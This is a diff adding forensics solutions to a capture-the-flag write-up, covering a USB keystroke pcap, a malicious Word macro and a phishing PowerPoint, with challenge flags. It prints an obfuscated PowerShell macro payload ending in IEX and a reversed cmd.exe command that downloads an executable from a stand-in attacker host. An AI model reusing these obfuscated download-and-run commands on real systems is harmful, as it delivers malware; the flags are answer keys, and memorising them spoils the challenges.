@@ -584,3 +584,38 @@ The flag is:
 ```
 CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}
 ```
+
+# Forensics<a name="forensics"></a>
+## Key Mission<a name="keyMission"></a>
+The challenge came with a pcap file, ```key_mission.pcap```
+### Solution
+The pcap file contained a lot of messages between the IP addresses ```3.2.0``` and ```3.2.1```. The protocol used was USB. Quick googling got me to a previous CTF chall that was similar to this.
+Using the [USB Keyboard Parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser), we get the flag.
+The flag is:
+```
+CHTB{a_plac3_fAr_fAr_away_fr0m_earth}
+```
+
+## Invitation<a name="invitation"></a>
+The challenge came with a word file, ```invitation.docx```
+### Solution
+Looking through the word file, we see that it has macros enabled. Upon analyzing the macros, we find that there are a lot of functions, and they print a base64 code. Upon decoding and analyzing it, we come across one bit of interesting code:
+```SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX ```
+Some of this code is reversed, and there are some regex functions applied. Decoding that, we get the flag.
+The flag is:
+```
+CHTB{maldocs_are_the_new_meta}
+```
+
+## AlienPhish<a name="alienPhish"></a>
+The challenge came with a ppt file, ```Alien Weaknesses.pptx```
+### Solution
+Analyzing this file on anyrun, we find that one of the elements on the title slide have an onclick action set, that runs commands on the command prompt.
+From there, we get the command,
+```cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'   pmet:vne$ = o$" c- llehsrewop&&for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&&if %X leq 0 call %kCX:*kCX!=%"```
+On analyzig the text in reverse, we see that it was running another command on Powershell. The command being: ```powershell -c "$o = $env:temp   'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o```.
+Decoding from base64 the name of the exe file, we get the flag.
+The flag is:
+```
+CHTB{pH1sHiNg_w0_m4cr0s???}
+```
